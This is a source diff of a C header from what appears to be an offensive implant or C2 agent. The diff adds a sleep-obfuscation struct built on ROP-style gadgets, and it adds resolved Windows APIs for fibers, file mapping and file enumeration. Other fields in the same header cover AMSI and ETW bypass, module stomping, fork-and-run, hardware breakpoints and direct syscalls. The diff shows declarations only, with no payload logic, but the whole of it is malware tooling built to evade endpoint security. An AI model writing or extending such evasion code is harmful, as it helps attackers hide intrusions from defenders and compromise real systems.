@@ -25,6 +25,14 @@
 EXTERN_C ULONG __Instance_offset;
 EXTERN_C PVOID __Instance;
 
+typedef struct _SLEEP_OBF {
+    UINT32 Technique;
+    UINT16 InsGadget;
+    PVOID  JmpGadget;
+    PVOID  RetGadget;
+    PVOID  NtContinueGadget;
+} SLEEP_OBF, *PSLEEP_OBF;
+
 typedef struct _BUFFER {
     PVOID  Base;
     UINT64 Length;
@@ -35,12 +43,6 @@ typedef struct _STOMP {
     USTR  ModName;
     PVOID ModBase;
 } STOMP, *PSTOMP;
-
-typedef struct _GADGET {
-    PVOID JmpGadget;
-    PVOID RetGadget;
-    PVOID NtContinueGadget;
-} GADGET, *PGADGET;
 
 typedef struct _FORK {
     PSTR  Spawnto;
@@ -126,6 +128,23 @@ typedef struct _INSTANCE {
 
     PTEB Teb;
     struct {
+        D_API( UnmapViewOfFile );
+        D_API( MapViewOfFile );
+        D_API( CreateFileMappingA );
+        D_API( ConvertFiberToThread );
+        D_API( CreateFiber );
+        D_API( ConvertThreadToFiber );
+        D_API( SwitchToFiber );
+        D_API( DeleteFiber );
+        D_API( strcat );
+        D_API( GetFileSize );
+        D_API( FindClose );
+        D_API( FindNextFileA );
+        D_API( FindNextFileW );
+        D_API( FindFirstFileW );
+        D_API( FindFirstFileA );
+        D_API( RtlDeleteTimer );
+        D_API( RtlDeleteTimerQueue );
         D_API( vprintf );
         D_API( strncmp );
         D_API( RtlDeleteCriticalSection );
@@ -278,19 +297,18 @@ typedef struct _INSTANCE {
     } Win32;
 
     struct {
-        BUFFER Region;
-        BUFFER RxRegion;
-        BUFFER RwRegion;
-        STOMP  Stomp;
-        PVOID  StackBase;
-        PVOID  StackLimit;
-        BOOL   AmsiBypass;
-        BOOL   EtwBypass;
-        PVOID  Heap;
-        GADGET Gadgets;
-        FORK   Fork;
-        HWBP   Hwbp;
-        SYSC   Syscall;
+        BUFFER    Region;
+        BUFFER    RxRegion;
+        BUFFER    RwRegion;
+        STOMP     Stomp;
+        PVOID     StackBase;
+        BOOL      AmsiBypass;
+        BOOL      EtwBypass;
+        PVOID     Heap;
+        FORK      Fork;
+        HWBP      Hwbp;
+        SYSC      Syscall;
+        SLEEP_OBF SleepObf;
     } Blackout;
 
     struct {
